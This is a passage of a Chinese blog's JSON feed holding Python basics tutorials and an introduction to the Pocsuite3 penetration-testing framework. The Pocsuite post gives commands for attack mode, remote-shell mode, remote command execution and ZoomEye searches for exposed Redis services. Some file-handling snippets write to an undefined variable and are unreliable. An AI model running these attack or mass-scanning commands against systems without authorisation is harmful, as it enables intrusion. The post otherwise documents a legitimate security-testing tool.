捕获并输出<br>\n The second parameter cannot be 0</p>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:1</span><br><span class=\"line\">b:0</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The second parameter cannot be 0</span><br><span class=\"line\">运行结束！</span><br></pre></td></tr></table></figure>\n<p>try…except…finally… 结构可以理解为 finally 就是为了确保设计程序时没有考虑到的异常处理而导致程序不能被完整的运行完并且进行清理，类似于文件处理时的 f.close ()，起到一个收尾的作用，无论是否异常都会执行该代码块</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%BA%8F%E5%88%97/",
            "url": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%BA%8F%E5%88%97/",
            "title": "Python学习------序列",
            "date_published": "2024-04-16T05:58:19.024Z",
            "content_html": "<h1 id=\"一-列表\"><a class=\"markdownIt-Anchor\" href=\"#一-列表\">#</a> 一。列表</h1>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/",
            "url": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/",
            "title": "Python学习------文件处理",
            "date_published": "2024-04-16T05:58:19.023Z",
            "content_html": "<blockquote>\n<p>文件就像一个仓库，可以存储各种类型的数据。根据用途可以将文件分为数据库文件、图像文件、音频文件、视屏文件、文本文件等。<br>\n<strong>文本文件</strong></p>\n</blockquote>\n<p>在文本文件中存储的是常规字符串，由文本行组成，每行通常由换行符 &quot;\\n&quot; 结尾</p>\n<p>对于文本文件来说，通常的操作流程为打开文件并创建对象，对该文件内容进行读取、写入、删除、修改等操作，关闭并保存文件</p>\n<p><strong>打开并创建对象</strong></p>\n<p>在 python 中内置了文件对象，通过 open () 函数就可以指定模式打开指定文件，并创建文件对象</p>\n<p>该函数格式如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">open(file[,mode=&#x27;r&#x27;[,buffering=-1]])</span><br></pre></td></tr></table></figure>\n<p>其中各个参数意义如下：</p>\n<blockquote>\n<p><strong>file</strong>：指定要打开或者创建的文件的名称，如果该文件不存在于当前目录中，则需要明确指出绝对路径。<br>\n<strong>mode</strong>：指定打开文件后的处理方式，其中包括读模式、写模式、追加模式、二进制模式、文本模式、读写模式等<br>\n **buffering：** 指定读写文件的缓冲模式，数值为 0 表示不缓存，数值为 1 表示使用行缓存模式，数值大于 1 表示缓冲区的大小，默认值为 - 1。二进制文件和非交互文本文件以固定大小的块为缓冲单位，等价于 io<br>\n<strong> 对文件内容进行操作</strong></p>\n</blockquote>\n<p>对文件内容进行的操作包括：文件的读取、写入、追加，以及设置采用二进制模式、文本模式、读写模式等</p>\n<p>(1) 向文本文件中写入内容</p>\n<p>如果需要向文本文件中写入内容，在打开文件时就需要指定文件的打开模式为写模式</p>\n<p>应根据不同的需求选取不同的写入模式：</p>\n<blockquote>\n<p><strong>w</strong>：写入模式。如果文件已存在，则先清空文件内容；如果文件不存在，则创建文件<br>\n<strong> x</strong>：写入模式。创建新文件，如果文件已存在，则抛出异常<br>\n<strong> a</strong>：追加模式。也是写入模式的一种，不覆盖文件的原始内容<br>\n例如创建一个 demo 文件并写入 &quot;Hello world&quot;</p>\n</blockquote>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = &quot;Hello world&quot;</span><br><span class=\"line\">f = open(&#x27;demo.txt&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">f.write(s)</span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<p>运行之后能发现路径下出现一个 demo.txt，里面便是 Hello world<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/eqWX5SEffL3F8QYT.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>再例如，在已经存在的 demo.txt 中写入 Hello<br>\nChina，并且不清空原始内容，则可以使用追加模式，即用 a 模式打开文件</p>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = &quot;Hello China&quot;</span><br><span class=\"line\">f = open(&#x27;demo.txt&#x27;,&#x27;a&#x27;)</span><br><span class=\"line\">f.write(s)</span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<p>打开 txt，发现追加成功<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xLGvQJeFMjzZUjP6.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>(2) 读取文件中的内容</p>\n<p>有时需要加载文本中的某行或者全部内容，就需要用到读取操作</p>\n<blockquote>\n<p><strong>r</strong>：读模式（默认模式，可以省略），如果文件不存在，则抛出异常<br>\n<strong> +</strong>：读写模式（可与其他模式组合使用）<br>\n例如读取 demo.txt 中的第一行的操作：</p>\n</blockquote>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f = open(&#x27;demo.txt&#x27;,&#x27;r&#x27;)</span><br><span class=\"line\">print(f.readline())</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello worldHello China</span><br></pre></td></tr></table></figure>\n<p>手动在 demo.txt 中换行添加内容，这里直接添加 111111111<br>\n 代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f = open(&#x27;demo.txt&#x27;,&#x27;r&#x27;)</span><br><span class=\"line\">print(f.read())</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello worldHello China</span><br><span class=\"line\">111111111</span><br></pre></td></tr></table></figure>\n<p><strong>关闭文件对象</strong><br>\n当操作完文件内容之后，一定要关闭文件对象，这样才能确保所作的修改都保存到了文件当中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>文件操作基本遵循 &quot;打开 -&gt; 读写 -&gt; 关闭&quot; 的流程，但是如果文件读写操作代码引发了异常，就很难保证文件能够被正常关闭。可以使用上下文管理关键字 with 来避免产生这个问题。with 能够自动管理资源，总能保证文件正确关闭，并且可以在代码执行结束后自动还原开始执行代码块时的现场<br>\n代码：</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b = &#x27;bbb&#x27;</span><br><span class=\"line\">with open(&#x27;demo.txt&#x27;,&#x27;a&#x27;) as f:</span><br><span class=\"line\">    f.write(b)</span><br></pre></td></tr></table></figure>\n<p>查看 demo.txt 成功添加<br>\n另外可以指定是以文本模式还是二进制模式进行处理</p>\n<blockquote>\n<p>“t” - 文本 - 默认值。文本模式。<br>\n“b” - 二进制 - 二进制模式（例如图像）。<br>\n这些知道了就可以来进行一下实战应用，可以看下 misc 比较常见的考点，16 进制的翻转</p>\n</blockquote>\n<p>先拿一张正常的图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jbUQT3ZTSfYKV1lE.png!thumbnail\" alt=\"\"></p>\n<p>用 winhex 来查看下图片的头和尾</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/djMYwjK7xhMXexxm.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/oskErrn7f27uZDnJ.png!thumbnail\" alt=\"\"></p>\n<p>发现都是没有问题的，那就开始使用 python 进行翻转</p>\n<p>首先我们先以二进制形式打开读取这张图片，将其存入到变量 x 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;cat.jpg&#x27;,&#x27;rb&#x27;) as f:</span><br><span class=\"line\">    x = f.read()</span><br></pre></td></tr></table></figure>\n<p>再对存入 x 中的内容进行翻转，将其存入到变量 re 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re = x[::-1]</span><br></pre></td></tr></table></figure>\n<p>最后以二进制的形式创建打开写入一个 new 文件中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;new&#x27;,&#x27;wb&#x27;) as f:</span><br><span class=\"line\">    f1.write(re)</span><br></pre></td></tr></table></figure>\n<p>这样就实现了图片的 16 进制翻转，将 new 文件拖入 winhex 查看一下头尾<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jX7EwrXUvU1AcmOm.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uQ6CBEa7uJdNFDad.png!thumbnail\" alt=\"\"></p>\n<p>按 16 进制位成功翻转，如果想实现将 16 进制数值从头到尾全部翻转的话可以将图片的 16 进制进行复制使用文本形式打开文件，这里将 16 进制存入 re.txt 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;re.txt&#x27;,&#x27;r&#x27;) as f:</span><br><span class=\"line\">    x = f.read()</span><br></pre></td></tr></table></figure>\n<p>同样进行翻转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re = x[::-1]</span><br></pre></td></tr></table></figure>\n<p>这里的写入需要注意一个问题，可能会报错</p>\n<blockquote>\n<p>TypeError: a bytes-like object is required, not ‘str’<br>\n当文本写成一个文件的时候是需要将 str 类型的数据转换为 byte 类型的数据的，因此，在写入的时候需要加上类型的转换</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;new&#x27;,&#x27;wb&#x27;) as f1:</span><br><span class=\"line\">    f1.write(bytes.fromhex(re))</span><br></pre></td></tr></table></figure>\n<p>再来看看 new 文件的 16 进制头尾<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/esDXQupsJSzV5llx.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2V75YrGcY54SzRfY.png!thumbnail\" alt=\"\"></p>\n<p>发现确实是一种文本格式的翻转了，而不是 16 进制位的翻转</p>\n<p>同样的，将该代码以同样的形式可以翻转成为一张正常的图片</p>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with open(&#x27;re.txt&#x27;,&#x27;r&#x27;) as f:</span><br><span class=\"line\">    x = f.read()</span><br><span class=\"line\">    re = x[::-1]</span><br><span class=\"line\">with open(&#x27;new.jpg&#x27;,&#x27;wb&#x27;) as f:</span><br><span class=\"line\">    f1.write(bytes.fromhex(re))</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xmyjyH0IvPFoDDAC.png!thumbnail\" alt=\"\"></p>\n<p>成功还原小猫的图片</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/",
            "url": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/",
            "title": "Python学习------控制结构",
            "date_published": "2024-04-16T05:58:19.021Z",
            "content_html": "<blockquote>\n<p>常见的编程语言通常包含三大控制结构：顺序结构、选择结构和循环结构。其中，顺序结构就是一句跟着一句执行。而选择结构则是通过条件判断，最终选择出所需要的结果。循环结构时通过重复有规律性的操作，从而减少代码量，使代码表达更为简洁。<br>\n<strong>选择结构</strong></p>\n</blockquote>\n<p>在编程时，当需要根据条件表达式的值确定下一步的执行流程时，通常会用到选择结构，最为常用的选择结构语句是 if 语句</p>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = 1</span><br><span class=\"line\">if(a&gt;0):</span><br><span class=\"line\">    print(a)</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n<p>有时会希望输出自己所设定的一句话或者是某个提示，例如经典的学生成绩的优秀、良好和不及格，分为小于六十、大于等于六十小于八十、大于等于八十三个分段<br>\n代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">score = int(input())</span><br><span class=\"line\">if (score &lt; 60):</span><br><span class=\"line\">    print(&quot;不及格&quot;)</span><br><span class=\"line\">if (60&lt;=score&lt;80):</span><br><span class=\"line\">    print(&quot;良好&quot;)</span><br><span class=\"line\">if (score&gt;=80):</span><br><span class=\"line\">    print(&quot;优秀&quot;)</span><br></pre></td></tr></table></figure>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">100</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">优秀</span><br></pre></td></tr></table></figure>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">59</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">不及格</span><br></pre></td></tr></table></figure>\n<p><strong>循环结构</strong><br>\n在 python 中主要有两种类型的循环结构：for 循环和 while 循环，for 循环一般用于有明显边界范围的情况，例如从 1 加到 100。而 while 循环一般用于循环次数难以确定的情况下</p>\n<p><strong>for 循环：</strong></p>\n<p>求 1+2+3+…+100</p>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum = 0</span><br><span class=\"line\">for i in range(1,101):</span><br><span class=\"line\">    sum += i</span><br><span class=\"line\">print(sum)</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5050</span><br></pre></td></tr></table></figure>\n<p><strong>while：</strong><br>\n求解 1+2+3+…+x，x 为输入的变量</p>\n<p>这里可以将 x 作为第一个值，从 x 进行倒序相加，判断条件为 x!=0 这样就能实现不确定的输入数值加到一的程序</p>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x = int(input())</span><br><span class=\"line\">sum = 0</span><br><span class=\"line\">while x != 0:</span><br><span class=\"line\">    sum = sum + x</span><br><span class=\"line\">    x = x-1</span><br><span class=\"line\">print(sum)</span><br></pre></td></tr></table></figure>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">100</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5050</span><br></pre></td></tr></table></figure>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">50</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1275</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Pocsuite%E6%A1%86%E6%9E%B6/",
            "url": "https://nnnpc.github.io/2024/04/16/Pocsuite%E6%A1%86%E6%9E%B6/",
            "title": "Pocsuite框架",
            "date_published": "2024-04-16T05:58:19.019Z",
            "content_html": "<blockquote>\n<p>在渗透测试过程中，会面对大量的渗透概念验证（Proof of<br>\nConcept，POC）和漏洞利用（Exploit，EXP），从中查找所需要的对应脚本非常困难，而渗透测试框架的出现解决了这一问题，在编写时就将 POC 和 EXP 按照一定的格式进行限制，按照文件夹或文件名进行分类，并内置了许多可调用的模块，以便于 POC 和 EXP 的快速编写。<br>\n常见的渗透测试框架包括 Metasploit、Pocsuite、Fsociety 等，这里主要介绍 Pocsuite 渗透测试框架的使用及编写</p>\n</blockquote>\n<p><strong>1.Pocsuite 框架</strong></p>\n<blockquote>\n<p>Pocsuite 是一款基于漏洞与 POC 的远程漏洞验证框架，支持 Windows/Linux/Mac<br>\nOS<br>\nX 等系统，整个框架操作灵活，既方便了对漏洞的管理、查找等，也提高了工作效率。<br>\n先了解两个基本概念：POC，是用来验证漏洞是否存在的一段代码；EXP，指利用系统漏洞进行渗透。先有 POC，后有 EXP。<br>\n你可以直接使用 Pocsuite 进行漏洞的验证与利用，也可以基于 Pocsuite 进行 POC/EXP 的开发，因为 Pocsuite 同时也是一个 POC 开发框架。你还可以在漏洞测试工具里直接集成 Pocsuite，因为 Pocsuite 也提供标准的调用类</p>\n</blockquote>\n<p><strong>功能介绍</strong></p>\n<p><strong>漏洞测试框架</strong></p>\n<p>Pocsuite 用 Python3 编写，支持验证、利用及壳三种插件模式，你可以指定单个目标或者从文件中导入多个目标，使用单个 POC 或者 POC 集合进行漏洞的验证或利用。可以使用命令行模式进行调用，也支持类似 Metaspolit 的交互模式进行处理，除此之外，还包含了一些基本功能，如输出结果报告等</p>\n<p><strong>POC/EXP 开发包</strong></p>\n<p>Pocsuite<br>\n3 也是一个 POC/EXP 的 SDK（也就是开发包），封装了一些基础的 POC 类以及一些常用的方法，比如 Webshell 的相关方法，基于 Pocsuite<br>\n3 进行 POC/EXP 的开发，只需要编写最核心的漏洞验证部分代码，而不用去关心整体的结果输出等其他一些处理。基于 Pocsuite<br>\n3 编写的 POC/EXP 可以直接呗 Pocsuite 使用，Seebug 网站也有几千个基于 Pocsuite 的 POC/EXP</p>\n<p><strong>可被集成模块</strong></p>\n<p>Pocsuite<br>\n3 除了本身是一个安全工具，也可以作为一个 Python 包被集成进漏洞测试模块。还可基于 Pocsuite<br>\n3 开发自己的应用，在 Pocsuite<br>\n3 里封装了可以被其他程序导入的 POC 调用类，你可以基于 Pocsuite<br>\n3 进行二次开发，调用 Pocsuite 3 开发自己的漏洞验证工具</p>\n<p><strong>集成 ZoomEye、Seebug、Ceye</strong></p>\n<p>Pocsuite 3 还集成了 ZoomEye、Seebug 和 Ceye API，你可以利用 ZoomEye<br>\nAPI 批量获取指定条件的测试目标（使用 ZoomEye 的 Dork 进行搜索），同时通过 Seebug<br>\nAPI 读取指定组件或者类型的漏洞的 POC 或者本地 POC，进行自动化的批量测试。也可以利用 Ceye 验证盲打的 DNS 和 HTTP 请求</p>\n<p><strong>安装</strong></p>\n<blockquote>\n<p>Pocsuite 的安装十分便捷这里提供两种安装方法，可以根据自己主机的命令来选择适合的方法进行安装，安装完成后使用 pocsuite-version 验证安装是否成功</p>\n</blockquote>\n<p><strong>方法一：</strong></p>\n<p>使用下面命令下载最新的源代码 zip 包，并以解压的方式进行安装，如下所示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/knownsec/pocsuite3/archive/master.zip</span><br><span class=\"line\">unzip master.zip</span><br></pre></td></tr></table></figure>\n<p>回显如图所示：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pITYUVlhx0BFePPS.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>安装依赖：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install requests requests-toolbelt </span><br><span class=\"line\">pip3 install pyreadline </span><br><span class=\"line\">pip3 install colorlog </span><br><span class=\"line\">pip3 install faker</span><br></pre></td></tr></table></figure>\n<p>其实就是缺什么装什么，看清楚报错，安装需要的东西即可（以上是我遇到的）安装好后进入 pocsuite3-master/pocsuite3 文件夹输入如下命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cli.py -h</span><br></pre></td></tr></table></figure>\n<p>如果显示正常则如下图所示：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/sewas5uzlj04cLBH.png!thumbnail\" alt=\"\"></p>\n<p><strong>方法二：</strong></p>\n<p>直接使用 pip 命令安装方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pocsuite3</span><br><span class=\"line\">或者</span><br><span class=\"line\">pip3 install -U pocsuite3 --no-cache-dir </span><br></pre></td></tr></table></figure>\n<p>当报错需要更新你的 pip 时也可以使用语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install python3-pip </span><br></pre></td></tr></table></figure>\n<p>安装完成后需要在 Pocsuite 文件夹内直接输入命令检查安装版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -version</span><br></pre></td></tr></table></figure>\n<p>结果：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/C3WtqtE0AdZnyN32.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>个人习惯是 pip 安装会舒服一些也方便一些</p>\n<p><strong>使用方法</strong></p>\n<blockquote>\n<p>Pocsuite 具有两种交互模式，一种是命令行模式，类似于我们熟悉的 sqlmap 的交互方式，另一种是控制台交互模式，类似于 w3af 或者 Metasploit 的界面<br>\n在使用 Pocsuite 时，我们可以使用<br>\n–verify 参数来调用<em> verify 方法，用于验证目标是否存在漏洞；用<br>\n–attack 参数调用</em> attack 方法，用来向目标发起攻击</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def _attack(self):</span><br><span class=\"line\">  result = &#123;&#125;</span><br><span class=\"line\">  #write your code here</span><br><span class=\"line\">  return self.parse_output(result)</span><br><span class=\"line\">  </span><br><span class=\"line\">def _verify(self):</span><br><span class=\"line\">  result = &#123;&#125;</span><br><span class=\"line\">  #write your code here</span><br><span class=\"line\">  return self.parse_output(result)</span><br></pre></td></tr></table></figure>\n<p>1.Verify 验证模式，验证目标是否存在漏洞。-r 为脚本路径，-u 为目标地址，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -r pocs/test.py(poc脚本路径) -u (目标地址) --verify</span><br></pre></td></tr></table></figure>\n<p>2. 批量验证，将需要验证的所有目标 IP 写到一个 txt 文件中批量利用，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -r pocs/test.py(poc脚本路径) -f url.txt --verify</span><br></pre></td></tr></table></figure>\n<p>3. 加载文件夹下的所有 poc 对目标进行测试，-r 为文件夹下路径，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -r pocs/*(poc脚本路径) -u (目标地址) --verify</span><br></pre></td></tr></table></figure>\n<p>4. 使用多线程。–threads 表示线程数，在多目标场景下，可以使用该参数提高效率，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -r pocs/test.py(poc脚本路径) -u (目标地址) --verify --threads 10</span><br></pre></td></tr></table></figure>\n<p>5. 使用 Zoomeye 搜索引擎，搜索开放端口为 6379 的 Redis 服务，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cli.py --dork &#x27;port:6379&#x27; --vul-keyword &#x27;redis&#x27; --max-page 2</span><br></pre></td></tr></table></figure>\n<p>6.Attack 模式，向目标发起有效攻击，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -r pocs/test.py(poc脚本路径) -u (目标地址) --attack</span><br></pre></td></tr></table></figure>\n<p>7. 使用 shell 交互式模式，对目标进行远程控制，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -r pocs/test.py(poc脚本路径) -u (目标地址) --shell</span><br></pre></td></tr></table></figure>\n<p>8. 使用自定义命令’command’，调用外部传递参数，进行半交互式命令执行，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pocsuite -r pocs/test.py(poc脚本路径) -u (目标地址) --attack --command &quot;whoami&quot;</span><br></pre></td></tr></table></figure>\n<p>Pocsuite 框架有利于 POC/EXP 的快速编写，并且内置的许多模块能更好地帮助渗透，比如批量 poc 测试 / 打批量目标。可以使用内置工具来进行搜索特定条件的目标等等。对于 